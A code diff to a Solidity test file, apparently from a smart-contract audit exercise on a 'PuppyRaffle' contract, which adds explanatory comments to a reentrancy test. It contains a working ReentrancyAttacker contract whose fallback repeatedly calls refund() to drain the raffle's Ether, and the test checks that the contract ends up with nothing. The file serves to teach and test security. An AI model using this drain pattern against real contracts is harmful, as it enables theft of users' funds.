@@ -289,18 +289,20 @@ function testTotalFeesOverflow() public playersEntered {
         assert(gasUsedFirst < gasUsedSecond);
         }
 
-     /////////////////////////////////////
-    /// Test Reentrancy               ///
-    ////////////////////////////////////
+     ///////////////////////////////////
+     /// Test Reentrancy            ///
+    //////////////////////////////////
     function testReentrance() public playersEntered {
-        ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
-        vm.deal(address(attacker), 1e18);
-        uint256 startingAttackerBalance = address(attacker).balance;
+        ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle)); // deploy attacker contract
+        vm.deal(address(attacker), 1e18); // The attacker contract is given 1 Ether for entrance fee 
+        uint256 startingAttackerBalance = address(attacker).balance; // The initial balances of the attacker and the PuppyRaffle contract are stored for comparison after the attack.
         uint256 startingContractBalance = address(puppyRaffle).balance;
 
-        attacker.attack();
+        attacker.attack(); // The attack() function is executed, which triggers the following sequence:
+                           // Enter the raffle by calling puppyRaffle.enterRaffle.
+                           // Call the refund() function, initiating the reentrancy attack.
 
-        uint256 endingAttackerBalance = address(attacker).balance;
+        uint256 endingAttackerBalance = address(attacker).balance; 
         uint256 endingContractBalance = address(puppyRaffle).balance;
         assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
         assertEq(endingContractBalance, 0);
@@ -318,17 +320,17 @@ contract ReentrancyAttacker {
     }
 
     function attack() external payable {
-        address[] memory players = new address[](1);
-        players[0] = address(this);
-        puppyRaffle.enterRaffle{value: entranceFee}(players);
-        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
-        puppyRaffle.refund(attackerIndex);
+        address[] memory players = new address[](1); // initialize a dynamic array with a fixed size of 1
+        players[0] = address(this); // Since this array has only 1 element, players[0] is the only available index
+        puppyRaffle.enterRaffle{value: entranceFee}(players); // The attacker enters the raffle using their contract address as the player.
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this)); //The index of the attacker in the players array is retrieved.
+        puppyRaffle.refund(attackerIndex); // The attacker then calls refund() to start the reentrancy attack.
     }
 
+    // When Ether is sent, the attacker’s fallback() function is triggered.
     fallback() external payable {
-        if (address(puppyRaffle).balance >= entranceFee) {
-            puppyRaffle.refund(attackerIndex);
+        if (address(puppyRaffle).balance >= entranceFee) {  // checks if the PuppyRaffle contract still has enough Ether to refund again.
+            puppyRaffle.refund(attackerIndex); // If so, it calls refund() again, repeating the process until the contract's balance is drained.
         }
     }
 }
-
